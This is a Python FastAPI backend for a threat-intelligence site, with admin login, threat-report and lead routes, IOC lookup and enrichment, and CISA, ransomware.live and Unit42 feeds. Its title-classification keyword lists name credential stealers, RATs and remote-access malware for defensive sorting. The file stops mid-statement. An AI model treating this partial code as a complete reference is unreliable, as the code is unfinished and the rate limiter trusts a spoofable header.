from dotenv import load_dotenv
from pathlib import Path
import os

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

from fastapi import FastAPI, APIRouter, HTTPException, Request, Depends
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import logging
from pydantic import BaseModel, Field, ConfigDict, BeforeValidator, EmailStr
from typing import List, Optional, Annotated, Any
import uuid
import asyncio
import re
from datetime import datetime, timezone, timedelta
import bcrypt
import jwt
import httpx
from bson import ObjectId

# ---------------------------------------------------------------------------
# Setup
# ---------------------------------------------------------------------------
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

JWT_ALGORITHM = "HS256"
CISA_FEED_URL = "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = FastAPI(title="NivX Machines API")
api_router = APIRouter(prefix="/api")

# ---------------------------------------------------------------------------
# Model helpers
# ---------------------------------------------------------------------------
PyObjectId = Annotated[str, BeforeValidator(str)]


def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


# ---------------------------------------------------------------------------
# Auth utils
# ---------------------------------------------------------------------------
def hash_password(password: str) -> str:
    return bcrypt.hashpw(password.encode("utf-8"), bcrypt.gensalt()).decode("utf-8")


def verify_password(plain: str, hashed: str) -> bool:
    return bcrypt.checkpw(plain.encode("utf-8"), hashed.encode("utf-8"))


def get_jwt_secret() -> str:
    return os.environ["JWT_SECRET"]


def create_access_token(user_id: str, email: str) -> str:
    payload = {
        "sub": user_id,
        "email": email,
        "exp": datetime.now(timezone.utc) + timedelta(days=7),
        "type": "access",
    }
    return jwt.encode(payload, get_jwt_secret(), algorithm=JWT_ALGORITHM)


async def get_current_user(request: Request) -> dict:
    token = request.cookies.get("access_token")
    if not token:
        auth_header = request.headers.get("Authorization", "")
        if auth_header.startswith("Bearer "):
            token = auth_header[7:]
    if not token:
        raise HTTPException(status_code=401, detail="Not authenticated")
    try:
        payload = jwt.decode(token, get_jwt_secret(), algorithms=[JWT_ALGORITHM])
        if payload.get("type") != "access":
            raise HTTPException(status_code=401, detail="Invalid token type")
        user = await db.users.find_one({"_id": ObjectId(payload["sub"])})
        if not user:
            raise HTTPException(status_code=401, detail="User not found")
        user["_id"] = str(user["_id"])
        user.pop("password_hash", None)
        return user
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Token expired")
    except jwt.InvalidTokenError:
        raise HTTPException(status_code=401, detail="Invalid token")


# ---------------------------------------------------------------------------
# Pydantic Models
# ---------------------------------------------------------------------------
class LoginInput(BaseModel):
    email: str
    password: str


class ProcessNode(BaseModel):
    name: str
    pid: Optional[str] = None
    cmd: Optional[str] = None
    malicious: bool = False
    children: List["ProcessNode"] = []


class ThreatReportBase(BaseModel):
    title: str
    summary: str
    severity: str = "high"  # critical | high | medium | low
    category: str = "Malware"
    threat_actor: Optional[str] = None
    image_url: Optional[str] = None
    attack_chain: List[str] = []  # MITRE ATT&CK ordered tactics
    iocs: List[str] = []
    process_tree: Optional[ProcessNode] = None
    source: str = "NivX Intel"


class ThreatReportCreate(ThreatReportBase):
    pass


class ThreatReport(ThreatReportBase):
    model_config = ConfigDict(extra="ignore")
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    created_at: str = Field(default_factory=now_iso)
    updated_at: str = Field(default_factory=now_iso)


ProcessNode.model_rebuild()


class LeadCreate(BaseModel):
    name: str
    email: EmailStr
    company: Optional[str] = None
    phone: Optional[str] = None
    company_size: Optional[str] = None
    interest: Optional[str] = None
    message: Optional[str] = None
    website: Optional[str] = None  # honeypot — real users leave blank


class Lead(BaseModel):
    model_config = ConfigDict(extra="ignore")
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    name: str
    email: str
    company: Optional[str] = None
    phone: Optional[str] = None
    company_size: Optional[str] = None
    interest: Optional[str] = None
    message: Optional[str] = None
    status: str = "new"
    created_at: str = Field(default_factory=now_iso)


LEAD_STATUSES = ["new", "contacted", "qualified", "archived"]


class LeadStatusUpdate(BaseModel):
    status: str


# ---------------------------------------------------------------------------
# Auth routes
# ---------------------------------------------------------------------------
@api_router.post("/auth/login")
async def login(payload: LoginInput):
    email = payload.email.lower().strip()
    user = await db.users.find_one({"email": email})
    if not user or not verify_password(payload.password, user["password_hash"]):
        raise HTTPException(status_code=401, detail="Invalid email or password")
    token = create_access_token(str(user["_id"]), email)
    return {
        "access_token": token,
        "user": {"id": str(user["_id"]), "email": email, "name": user.get("name", "Admin"), "role": user.get("role", "admin")},
    }


@api_router.get("/auth/me")
async def me(user: dict = Depends(get_current_user)):
    return {"id": user["_id"], "email": user["email"], "name": user.get("name", "Admin"), "role": user.get("role", "admin")}


# ---------------------------------------------------------------------------
# Threat report routes
# ---------------------------------------------------------------------------
@api_router.get("/threats", response_model=List[ThreatReport])
async def list_threats():
    docs = await db.threat_reports.find({}, {"_id": 0}).sort("created_at", -1).to_list(200)
    return [ThreatReport(**d) for d in docs]


@api_router.get("/threats/{threat_id}", response_model=ThreatReport)
async def get_threat(threat_id: str):
    doc = await db.threat_reports.find_one({"id": threat_id}, {"_id": 0})
    if not doc:
        raise HTTPException(status_code=404, detail="Threat report not found")
    return ThreatReport(**doc)


@api_router.post("/threats", response_model=ThreatReport)
async def create_threat(payload: ThreatReportCreate, user: dict = Depends(get_current_user)):
    report = ThreatReport(**payload.model_dump())
    await db.threat_reports.insert_one(report.model_dump())
    return report


@api_router.put("/threats/{threat_id}", response_model=ThreatReport)
async def update_threat(threat_id: str, payload: ThreatReportCreate, user: dict = Depends(get_current_user)):
    existing = await db.threat_reports.find_one({"id": threat_id}, {"_id": 0})
    if not existing:
        raise HTTPException(status_code=404, detail="Threat report not found")
    data = payload.model_dump()
    data["updated_at"] = now_iso()
    await db.threat_reports.update_one({"id": threat_id}, {"$set": data})
    merged = {**existing, **data}
    return ThreatReport(**merged)


@api_router.delete("/threats/{threat_id}")
async def delete_threat(threat_id: str, user: dict = Depends(get_current_user)):
    res = await db.threat_reports.delete_one({"id": threat_id})
    if res.deleted_count == 0:
        raise HTTPException(status_code=404, detail="Threat report not found")
    return {"deleted": True}


# ---------------------------------------------------------------------------
# Leads (Request a Security Assessment)
# ---------------------------------------------------------------------------
_lead_rate: dict[str, list] = {}
LEAD_RATE_LIMIT = 3          # max submissions
LEAD_RATE_WINDOW = 600       # per 10 minutes (seconds)


def _client_ip(request: Request) -> str:
    fwd = request.headers.get("x-forwarded-for")
    if fwd:
        return fwd.split(",")[0].strip()
    return request.client.host if request.client else "unknown"


@api_router.post("/leads", response_model=Lead)
async def create_lead(payload: LeadCreate, request: Request):
    # Honeypot: bots fill hidden 'website' field
    if payload.website:
        logger.info("Lead rejected: honeypot triggered")
        return Lead(name=payload.name, email="honeypot@blocked.local")

    # Simple in-memory IP rate limiting
    ip = _client_ip(request)
    now_ts = datetime.now(timezone.utc).timestamp()
    hits = [t for t in _lead_rate.get(ip, []) if now_ts - t < LEAD_RATE_WINDOW]
    if len(hits) >= LEAD_RATE_LIMIT:
        raise HTTPException(status_code=429, detail="Too many requests. Please try again in a few minutes.")
    hits.append(now_ts)
    _lead_rate[ip] = hits

    data = payload.model_dump(exclude={"website"})
    lead = Lead(**data)
    await db.leads.insert_one(lead.model_dump())
    logger.info(f"New security assessment lead: {lead.email} ({lead.company})")
    return lead


@api_router.get("/leads", response_model=List[Lead])
async def list_leads(user: dict = Depends(get_current_user)):
    docs = await db.leads.find({}, {"_id": 0}).sort("created_at", -1).to_list(500)
    return [Lead(**d) for d in docs]


@api_router.patch("/leads/{lead_id}", response_model=Lead)
async def update_lead_status(lead_id: str, payload: LeadStatusUpdate, user: dict = Depends(get_current_user)):
    if payload.status not in LEAD_STATUSES:
        raise HTTPException(status_code=400, detail=f"Invalid status. Allowed: {LEAD_STATUSES}")
    doc = await db.leads.find_one({"id": lead_id}, {"_id": 0})
    if not doc:
        raise HTTPException(status_code=404, detail="Lead not found")
    await db.leads.update_one({"id": lead_id}, {"$set": {"status": payload.status}})
    doc["status"] = payload.status
    return Lead(**doc)


# ---------------------------------------------------------------------------
# Live external threat feed (CISA Known Exploited Vulnerabilities)
# ---------------------------------------------------------------------------
_feed_cache: dict[str, Any] = {"ts": None, "data": None}


# ---------------------------------------------------------------------------
# Smart IOC lookup / enrichment (key-free sources + prefilled deep links)
# ---------------------------------------------------------------------------
def _classify_ioc(value: str) -> str:
    v = value.strip()
    if re.fullmatch(r"[a-fA-F0-9]{64}", v):
        return "sha256"
    if re.fullmatch(r"[a-fA-F0-9]{40}", v):
        return "sha1"
    if re.fullmatch(r"[a-fA-F0-9]{32}", v):
        return "md5"
    if re.fullmatch(r"(\d{1,3}\.){3}\d{1,3}", v):
        return "ip"
    if v.lower().startswith(("http://", "https://")):
        return "url"
    if re.fullmatch(r"([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}", v.replace("[.]", ".")):
        return "domain"
    return "unknown"


def _ioc_links(value: str, kind: str) -> dict:
    v = value.strip().replace("[.]", ".")
    from urllib.parse import quote
    q = quote(v, safe="")
    links = {}
    if kind in ("md5", "sha1", "sha256"):
        links["VirusTotal"] = f"https://www.virustotal.com/gui/file/{v}"
        links["MalwareBazaar"] = f"https://bazaar.abuse.ch/browse.php?search={kind}%3A{v}"
        links["ThreatFox"] = f"https://threatfox.abuse.ch/browse.php?search=hash%3A{v}"
        links["Hybrid Analysis"] = f"https://www.hybrid-analysis.com/search?query={v}"
        links["IBM X-Force"] = f"https://exchange.xforce.ibmcloud.com/malware/{v}"
    elif kind == "ip":
        links["VirusTotal"] = f"https://www.virustotal.com/gui/ip-address/{v}"
        links["AbuseIPDB"] = f"https://www.abuseipdb.com/check/{v}"
        links["Cisco Talos"] = f"https://talosintelligence.com/reputation_center/lookup?search={v}"
        links["Shodan"] = f"https://www.shodan.io/host/{v}"
        links["GreyNoise"] = f"https://viz.greynoise.io/ip/{v}"
        links["IBM X-Force"] = f"https://exchange.xforce.ibmcloud.com/ip/{v}"
    elif kind == "domain":
        links["VirusTotal"] = f"https://www.virustotal.com/gui/domain/{v}"
        links["urlscan.io"] = f"https://urlscan.io/search/#{q}"
        links["Cisco Talos"] = f"https://talosintelligence.com/reputation_center/lookup?search={v}"
        links["Shodan"] = f"https://www.shodan.io/search?query=hostname%3A{v}"
        links["IBM X-Force"] = f"https://exchange.xforce.ibmcloud.com/url/{v}"
    elif kind == "url":
        links["VirusTotal"] = f"https://www.virustotal.com/gui/search/{q}"
        links["urlscan.io"] = f"https://urlscan.io/search/#{q}"
        links["IBM X-Force"] = f"https://exchange.xforce.ibmcloud.com/url/{q}"
    return links


# ---------------------------------------------------------------------------
# Optional key-based reputation providers (VirusTotal v3 + AbuseIPDB v2)
# Keys are OPTIONAL: absent keys are skipped gracefully. Results are cached in
# MongoDB (ioc_cache) for 6h to conserve free-tier daily quotas.
# ---------------------------------------------------------------------------
VT_API_KEY = os.environ.get("VIRUSTOTAL_API_KEY")
ABUSEIPDB_API_KEY = os.environ.get("ABUSEIPDB_API_KEY")
URLSCAN_API_KEY = os.environ.get("URLSCAN_API_KEY")
_REP_TTL = timedelta(hours=6)


def _vt_url_id(u: str) -> str:
    import base64
    return base64.urlsafe_b64encode(u.encode("utf-8")).decode("utf-8").strip("=")


async def _vt_lookup(hc: httpx.AsyncClient, kind: str, normalized: str) -> Optional[dict]:
    if not VT_API_KEY:
        return None
    if kind == "ip":
        path = f"ip_addresses/{normalized}"
    elif kind == "domain":
        path = f"domains/{normalized}"
    elif kind == "url":
        path = f"urls/{_vt_url_id(normalized)}"
    else:
        path = f"files/{normalized}"
    try:
        r = await hc.get(f"https://www.virustotal.com/api/v3/{path}", headers={"x-apikey": VT_API_KEY, "accept": "application/json"})
        if r.status_code == 404:
            return {"found": False, "malicious": 0, "suspicious": 0, "harmless": 0, "undetected": 0, "total": 0, "reputation": None}
        if r.status_code == 401:
            return {"error": "unauthorized"}
        if r.status_code == 429:
            return {"error": "rate_limited"}
        if r.status_code != 200:
            return {"error": f"http_{r.status_code}"}
        attrs = ((r.json() or {}).get("data") or {}).get("attributes") or {}
        stats = attrs.get("last_analysis_stats") or {}
        mal = stats.get("malicious", 0) or 0
        susp = stats.get("suspicious", 0) or 0
        harm = stats.get("harmless", 0) or 0
        undet = stats.get("undetected", 0) or 0
        total = mal + susp + harm + undet + (stats.get("timeout", 0) or 0)
        ptc = attrs.get("popular_threat_classification") or {}
        threat_categories = [c.get("value") for c in (ptc.get("popular_threat_category") or []) if c.get("value")]
        return {
            "found": True,
            "malicious": mal,
            "suspicious": susp,
            "harmless": harm,
            "undetected": undet,
            "total": total,
            "reputation": attrs.get("reputation"),
            "label": attrs.get("meaningful_name") or attrs.get("type_description"),
            "last_analysis_date": attrs.get("last_analysis_date"),
            "threat_label": ptc.get("suggested_threat_label"),
            "threat_categories": threat_categories[:6],
            "tags": (attrs.get("tags") or [])[:10],
        }
    except Exception:
        return {"error": "request_failed"}


async def _abuseipdb_lookup(hc: httpx.AsyncClient, normalized: str) -> Optional[dict]:
    if not ABUSEIPDB_API_KEY:
        return None
    try:
        r = await hc.get(
            "https://api.abuseipdb.com/api/v2/check",
            headers={"Key": ABUSEIPDB_API_KEY, "Accept": "application/json"},
            params={"ipAddress": normalized, "maxAgeInDays": "90"},
        )
        if r.status_code == 401:
            return {"error": "unauthorized"}
        if r.status_code == 429:
            return {"error": "rate_limited"}
        if r.status_code != 200:
            return {"error": f"http_{r.status_code}"}
        d = (r.json() or {}).get("data") or {}
        return {
            "score": d.get("abuseConfidenceScore"),
            "reports": d.get("totalReports"),
            "country": d.get("countryCode"),
            "isp": d.get("isp"),
            "domain": d.get("domain"),
            "whitelisted": d.get("isWhitelisted"),
        }
    except Exception:
        return {"error": "request_failed"}


async def _reputation(hc: httpx.AsyncClient, kind: str, normalized: str) -> Optional[dict]:
    """VT + AbuseIPDB reputation with 6h Mongo cache. Returns None when no keys set."""
    if not VT_API_KEY and not ABUSEIPDB_API_KEY:
        return None
    cache_key = f"{kind}:{normalized}"
    try:
        doc = await db.ioc_cache.find_one({"_id": cache_key})
        if doc and doc.get("ts"):
            if datetime.now(timezone.utc) - datetime.fromisoformat(doc["ts"]) < _REP_TTL:
                return doc.get("reputation")
    except Exception:
        pass
    rep = {"vt": await _vt_lookup(hc, kind, normalized), "abuseipdb": None}
    if kind == "ip":
        rep["abuseipdb"] = await _abuseipdb_lookup(hc, normalized)
    try:
        await db.ioc_cache.update_one({"_id": cache_key}, {"$set": {"reputation": rep, "ts": now_iso()}}, upsert=True)
    except Exception:
        pass
    return rep


async def _shodan_ip(hc: httpx.AsyncClient, ip: str) -> dict:
    try:
        r = await hc.get(f"https://internetdb.shodan.io/{ip}")
        return r.json() if r.status_code == 200 else {}
    except Exception:
        return {}


async def _geo_ip(hc: httpx.AsyncClient, ip: str) -> dict:
    try:
        r = await hc.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp,org,as,query")
        j = r.json()
        return j if j.get("status") == "success" else {}
    except Exception:
        return {}


async def _resolve_host(hc: httpx.AsyncClient, host: str) -> Optional[str]:
    """Resolve a hostname's first A record via Google DNS-over-HTTPS (no key)."""
    try:
        r = await hc.get(f"https://dns.google/resolve?name={host}&type=A", headers={"Accept": "application/json"})
        if r.status_code == 200:
            for ans in (r.json() or {}).get("Answer", []):
                if ans.get("type") == 1 and ans.get("data"):
                    return ans["data"]
    except Exception:
        pass
    return None


async def _do_lookup(hc: httpx.AsyncClient, value: str) -> dict:
    """Full IOC lookup: classify + free enrichment + optional key-based reputation."""
    value = (value or "").strip()
    kind = _classify_ioc(value)
    if kind == "unknown":
        return {"value": value, "type": "unknown", "links": {}, "enrichment": None, "reputation": None}
    normalized = value.replace("[.]", ".")
    result = {"value": value, "type": kind, "links": _ioc_links(value, kind), "enrichment": None, "reputation": None}

    try:
        if kind == "ip":
            sh, gj = await asyncio.gather(_shodan_ip(hc, normalized), _geo_ip(hc, normalized))
            result["enrichment"] = {
                "kind": "ip",
                "geo": {"country": gj.get("country"), "city": gj.get("city"), "isp": gj.get("isp"), "org": gj.get("org"), "asn": gj.get("as")} if gj else None,
                "open_ports": sh.get("ports", []),
                "hostnames": sh.get("hostnames", []),
                "tags": sh.get("tags", []),
                "vulns": sh.get("vulns", []),
                "sources": ["Shodan InternetDB", "ip-api.com"],
            }
        elif kind in ("domain", "url"):
            from urllib.parse import urlparse
            host = (urlparse(normalized).netloc if kind == "url" else normalized).split(":")[0]
            query = f"page.domain:{host}" if host else f"page.url:{normalized}"

            async def urlscan():
                try:
                    headers = {"API-Key": URLSCAN_API_KEY} if URLSCAN_API_KEY else {}
                    r = await hc.get(f"https://urlscan.io/api/v1/search/?q={query}&size=5", headers=headers)
                    if r.status_code != 200:
                        return {"scan_count": 0, "recent_scans": []}
                    j = r.json()
                    recent = [{"url": x["task"]["url"], "date": x["task"].get("time"), "score": x.get("verdicts", {}).get("overall", {}).get("score")} for x in j.get("results", [])[:5]]
                    return {"scan_count": j.get("total", 0), "recent_scans": recent}
                except Exception:
                    return {"scan_count": 0, "recent_scans": []}

            us, resolved = await asyncio.gather(urlscan(), _resolve_host(hc, host))
            sources = ["Google DNS", "urlscan.io"]
            enr = {
                "kind": "web",
                "host": host,
                "resolved_ip": resolved,
                "geo": None,
                "open_ports": [],
                "hostnames": [],
                "vulns": [],
                "scan_count": us["scan_count"],
                "recent_scans": us["recent_scans"],
                "sources": sources,
            }
            if resolved:
                sh, gj = await asyncio.gather(_shodan_ip(hc, resolved), _geo_ip(hc, resolved))
                enr["geo"] = {"country": gj.get("country"), "city": gj.get("city"), "isp": gj.get("isp"), "org": gj.get("org"), "asn": gj.get("as")} if gj else None
                enr["open_ports"] = sh.get("ports", [])
                enr["hostnames"] = sh.get("hostnames", [])
                enr["vulns"] = sh.get("vulns", [])
                enr["sources"] = ["Google DNS", "Shodan InternetDB", "ip-api.com", "urlscan.io"]
            result["enrichment"] = enr
        else:
            # File hash — key-free lookup against CIRCL hashlookup (known-file DB)
            enr = {
                "kind": "hash",
                "hash_type": kind,
                "found": False,
                "known_malicious": False,
                "filename": None,
                "filesize": None,
                "product": None,
                "source_label": None,
                "note": "Not found in the CIRCL known-file database. Use the deep links below to check reputation on VirusTotal, MalwareBazaar and others.",
                "sources": ["CIRCL hashlookup"],
            }
            try:
                r = await hc.get(f"https://hashlookup.circl.lu/lookup/{kind}/{normalized}", headers={"Accept": "application/json"})
                if r.status_code == 200:
                    j = r.json()
                    if isinstance(j, dict) and not j.get("message"):
                        enr["found"] = True
                        enr["known_malicious"] = bool(j.get("KnownMalicious"))
                        enr["filename"] = j.get("FileName")
                        enr["filesize"] = j.get("FileSize")
                        enr["product"] = (j.get("ProductCode") or {}).get("ProductName") if isinstance(j.get("ProductCode"), dict) else None
                        enr["source_label"] = j.get("KnownMalicious") or ("NSRL known-good file" if j.get("RDS:package_id") else "Known file")
                        enr["note"] = None
            except Exception:
                pass
            result["enrichment"] = enr
    except Exception as e:
        logger.error(f"IOC enrichment error: {e}")

    try:
        result["reputation"] = await _reputation(hc, kind, normalized)
    except Exception as e:
        logger.error(f"IOC reputation error: {e}")

    return result


@api_router.get("/ioc-config")
async def ioc_config():
    """Tells the frontend which key-based reputation providers are active."""
    return {"vt_enabled": bool(VT_API_KEY), "abuseipdb_enabled": bool(ABUSEIPDB_API_KEY)}


@api_router.get("/ioc-lookup")
async def ioc_lookup(value: str):
    value = (value or "").strip()
    if not value or len(value) > 2048:
        raise HTTPException(status_code=400, detail="Provide a valid IOC (hash, IP, domain or URL)")
    if _classify_ioc(value) == "unknown":
        raise HTTPException(status_code=422, detail="Could not recognize this as a hash, IP, domain or URL")
    async with httpx.AsyncClient(timeout=12, follow_redirects=True) as hc:
        return await _do_lookup(hc, value)


class BatchIOCInput(BaseModel):
    values: List[str] = Field(default_factory=list)


@api_router.post("/ioc-lookup-batch")
async def ioc_lookup_batch(payload: BatchIOCInput):
    # Accept a list of raw entries; split each on whitespace/comma/semicolon/newline.
    tokens: List[str] = []
    for entry in (payload.values or []):
        for tok in re.split(r"[\s,;]+", (entry or "").strip()):
            tok = tok.strip()
            if tok:
                tokens.append(tok)
    # Dedupe (case-insensitive) preserving order, cap at 50.
    seen = set()
    items: List[str] = []
    for t in tokens:
        key = t.lower()
        if key not in seen:
            seen.add(key)
            items.append(t)
    if not items:
        raise HTTPException(status_code=400, detail="Provide at least one IOC to analyze")
    if len(items) > 50:
        items = items[:50]

    sem = asyncio.Semaphore(8)
    async with httpx.AsyncClient(timeout=12, follow_redirects=True) as hc:
        async def one(v: str) -> dict:
            async with sem:
                try:
                    return await _do_lookup(hc, v)
                except Exception:
                    return {"value": v, "type": "unknown", "links": {}, "enrichment": None, "reputation": None}
        results = await asyncio.gather(*[one(v) for v in items])

    return {"count": len(results), "results": results}


@api_router.get("/live-feed")
async def live_feed():
    now = datetime.now(timezone.utc)
    if _feed_cache["data"] and _feed_cache["ts"] and (now - _feed_cache["ts"]) < timedelta(minutes=30):
        return _feed_cache["data"]
    try:
        async with httpx.AsyncClient(timeout=15) as hc:
            r = await hc.get(CISA_FEED_URL)
            r.raise_for_status()
            raw = r.json()
        vulns = raw.get("vulnerabilities", [])
        vulns_sorted = sorted(vulns, key=lambda v: v.get("dateAdded", ""), reverse=True)
        recent = [
            {
                "cve": v.get("cveID"),
                "vendor": v.get("vendorProject"),
                "product": v.get("product"),
                "name": v.get("vulnerabilityName"),
                "dateAdded": v.get("dateAdded"),
                "action": v.get("requiredAction"),
                "ransomware": v.get("knownRansomwareCampaignUse", "Unknown"),
                "nvd_url": f"https://nvd.nist.gov/vuln/detail/{v.get('cveID')}",
                "detail_url": f"https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext={v.get('cveID')}",
            }
            for v in vulns_sorted
        ]
        result = {
            "source": "CISA Known Exploited Vulnerabilities",
            "catalog_version": raw.get("catalogVersion"),
            "total_count": raw.get("count", len(vulns)),
            "ransomware_linked": sum(1 for v in vulns if v.get("knownRansomwareCampaignUse") == "Known"),
            "updated": now.isoformat(),
            "returned": len(recent),
            "items": recent,
        }
        _feed_cache["data"] = result
        _feed_cache["ts"] = now
        return result
    except Exception as e:
        logger.error(f"Live feed error: {e}")
        if _feed_cache["data"]:
            return _feed_cache["data"]
        raise HTTPException(status_code=502, detail="Unable to reach live threat feed")


_attack_cache: dict[str, Any] = {"ts": None, "data": None}


@api_router.get("/attack-feed")
async def attack_feed():
    """Real-time attack feed: recent ransomware victims from ransomware.live (cached 20 min)."""
    now = datetime.now(timezone.utc)
    if _attack_cache["data"] and _attack_cache["ts"] and (now - _attack_cache["ts"]) < timedelta(minutes=20):
        return _attack_cache["data"]
    try:
        async with httpx.AsyncClient(timeout=15, follow_redirects=True) as hc:
            r = await hc.get("https://api.ransomware.live/v2/recentvictims")
            r.raise_for_status()
            raw = r.json()
        items = []
        for v in raw[:40]:
            items.append({
                "victim": v.get("victim"),
                "group": v.get("group"),
                "country": v.get("country"),
                "sector": v.get("activity") if v.get("activity") not in (None, "Not Found") else None,
                "domain": v.get("domain"),
                "date": v.get("attackdate") or v.get("discovered"),
                "screenshot": v.get("screenshot"),
                "url": v.get("url"),
            })
        result = {
            "source": "ransomware.live · Recent Victims",
            "updated": now.isoformat(),
            "count": len(items),
            "items": items,
        }
        _attack_cache["data"] = result
        _attack_cache["ts"] = now
        return result
    except Exception as e:
        logger.error(f"Attack feed error: {e}")
        if _attack_cache["data"]:
            return _attack_cache["data"]
        raise HTTPException(status_code=502, detail="Unable to reach live attack feed")


# ---------------------------------------------------------------------------
# Unit42 Timely Threat Intel feed (real published intel from Palo Alto GitHub)
# ---------------------------------------------------------------------------
_intel_cache: dict[str, Any] = {"ts": None, "data": None}
UNIT42_REPO = "PaloAltoNetworks/Unit42-timely-threat-intel"

_INTEL_IMAGES = {
    "phishing": "https://images.pexels.com/photos/5380664/pexels-photo-5380664.jpeg?auto=compress&cs=tinysrgb&w=1000",
    "ransomware": "https://images.pexels.com/photos/60504/security-protection-anti-virus-software-60504.jpeg?auto=compress&cs=tinysrgb&w=1000",
    "rat": "https://images.pexels.com/photos/5473298/pexels-photo-5473298.jpeg?auto=compress&cs=tinysrgb&w=1000",
    "loader": "https://images.pexels.com/photos/11035380/pexels-photo-11035380.jpeg?auto=compress&cs=tinysrgb&w=1000",
    "scam": "https://images.pexels.com/photos/5380642/pexels-photo-5380642.jpeg?auto=compress&cs=tinysrgb&w=1000",
    "stealer": "https://images.pexels.com/photos/2881229/pexels-photo-2881229.jpeg?auto=compress&cs=tinysrgb&w=1000",
    "default": "https://images.pexels.com/photos/5483240/pexels-photo-5483240.jpeg?auto=compress&cs=tinysrgb&w=1000",
}


def _pick_intel_image(title: str) -> str:
    t = title.lower()
    for key, url in _INTEL_IMAGES.items():
        if key != "default" and key in t:
            return url
    return _INTEL_IMAGES["default"]


INTEL_TYPES = ["Ransomware", "Phishing", "RAT", "Loader", "Stealer", "Scam", "APT", "Other"]


def _intel_type(title: str) -> str:
    t = title.lower()
    if any(k in t for k in ["ransom", "lockbit", "akira", "blackcat", "alphv", "encrypt"]):
        return "Ransomware"
    if any(k in t for k in ["phish", "smish", "clickfix", "credential"]):
        return "Phishing"
    if any(k in t for k in ["rat", "asyncrat", "remote access", "njrat", "remcos"]):
        return "RAT"
    if any(k in t for k in ["loader", "castleloader", "downloader", "dropper"]):
        return "Loader"
    if any(k in t for k in ["stealer", "infostealer", "lumma", "redline"]):
        return "Stealer"
    if any(k in t for k in ["scam", "fraud", "impersonat"]):
        return "Scam"
    if any(k in t for k in ["apt", "espionage", "state-sponsored", "nation"]):
        return "APT"
    return "Other"


_intel_listing: dict[str, Any] = {"ts": None, "names": None}


async def _get_unit42_listing() -> list:
    now = datetime.now(timezone.utc)
    if _intel_listing["names"] and _intel_listing["ts"] and (now - _intel_listing["ts"]) < timedelta(minutes=60):
        return _intel_listing["names"]
    async with httpx.AsyncClient(timeout=20, follow_redirects=True) as hc:
        listing = await hc.get(f"https://api.github.com/repos/{UNIT42_REPO}/contents/")
        listing.raise_for_status()
        names = sorted([f["name"] for f in listing.json() if f["name"].endswith(".txt")], reverse=True)
    _intel_listing["names"] = names
    _intel_listing["ts"] = now
    return names


def _parse_unit42(name: str, text: str) -> dict:
    date = name[:10]
    title = name[11:-4].replace("-", " ")
    lines = text.splitlines()
    section = None
    notes, refs, indicators, authors = [], [], [], []
    for ln in lines:
        s = ln.strip()
        up = s.upper()
        if up.startswith("NOTES:"):
            section = "notes"
            continue
        if up.startswith("REFERENCES:"):
            section = "refs"
            continue
        if up.startswith("INDICATORS:") or up.startswith("INDICATORS "):
            section = "ind"
            continue
        if up.startswith("AUTHOR:"):
            section = "author"
            continue
        if not s:
            continue
        if section == "notes" and s.startswith("-"):
            notes.append(s.lstrip("- ").strip())
        elif section == "refs" and ("http" in s):
            refs.append(s.lstrip("- ").strip())
        elif section == "author" and s.startswith("-"):
            authors.append(s.lstrip("- ").strip())
        elif section == "ind":
            indicators.append(s)
    summary = " ".join(notes[:2])[:320] if notes else title
    ioc_lines = [i for i in indicators if "[.]" in i or "[:]" in i or "sha256" in i.lower() or "md5" in i.lower()]
    return {
        "name": name,
        "title": title,
        "date": date,
        "type": _intel_type(title),
        "authors": authors,
        "summary": summary,
        "notes": notes,
        "references": refs,
        "indicators": ioc_lines,
        "reference": refs[0] if refs else f"https://github.com/{UNIT42_REPO}/blob/main/{name}",
        "url": f"https://github.com/{UNIT42_REPO}/blob/main/{name}",
        "ioc_count": len(ioc_lines),
        "image": _pick_intel_image(title),
        "source": "Palo Alto Unit42",
    }


def _intel_card(full: dict) -> dict:
    """Lightweight card view (drops heavy indicator/notes lists)."""
    return {
        "name": full["name"], "title": full["title"], "date": full["date"], "type": full["type"],
        "summary": full["summary"], "reference": full["reference"], "url": full["url"],
        "ioc_count": full["ioc_count"], "image": full["image"], "source": full["source"],
    }


@api_router.get("/intel-report/{name}")
async def intel_report(name: str):
    """Full parsed Unit42 report for the in-app reader."""
    if not re.match(r"^[0-9A-Za-z._-]+\.txt$", name):
        raise HTTPException(status_code=400, detail="Invalid report name")
    try:
        async with httpx.AsyncClient(timeout=20, follow_redirects=True) as hc:
            resp = await hc.get(f"https://raw.githubusercontent.com/{UNIT42_REPO}/main/{name}")
            resp.raise_for_status()
            full = _parse_unit42(name, resp.text)
        full["indicators"] = full["indicators"][:500]
        return full
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Intel report error for {name}: {e}")
        raise HTTPException(status_code=502, detail="Unable to load report")


@api_router.get("/intel-feed")
async def intel_feed(page: int = 1, page_size: int = 9, q: str = "", type: str = "", since: str = ""):
    """Paginated + filterable Unit42 intel feed. Filters on filename metadata, fetches content per page."""
    page = max(1, page)
    page_size = min(max(1, page_size), 24)
    try:
        names = await _get_unit42_listing()

        def match(name: str) -> bool:
            title = name[11:-4].replace("-", " ")
            date = name[:10]
            if q and q.lower() not in title.lower():
                return False
            if type and _intel_type(title) != type:
                return False
            if since and date < since:
                return False
            return True

        filtered = [n for n in names if match(n)]
        total = len(filtered)
        start = (page - 1) * page_size
        page_names = filtered[start:start + page_size]

        async with httpx.AsyncClient(timeout=20, follow_redirects=True) as hc:
            async def fetch(name):
                try:
                    resp = await hc.get(f"https://raw.githubusercontent.com/{UNIT42_REPO}/main/{name}")
                    resp.raise_for_status()
                    return _intel_card(_parse_unit42(name, resp.text))
                except Exception:
                    return _intel_card(_parse_unit42(name, ""))

            items = await asyncio.gather(*[fetch(n) for n in page_names])

        return {
